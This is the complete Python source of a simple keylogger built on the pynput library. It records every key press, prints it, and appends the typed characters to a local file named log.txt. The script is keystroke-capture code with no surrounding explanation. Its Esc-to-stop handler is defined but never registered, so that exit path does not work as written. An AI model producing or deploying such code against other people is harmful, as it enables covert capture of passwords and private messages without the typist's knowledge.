import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def key_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt","a") as f:
            for key in keys:
                k= str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("key") == -1:
                    f.write(k)

def key_release(key):
    if key == key.esc:
        return False

with Listener(on_press=key_press) as listener:
    listener.join()
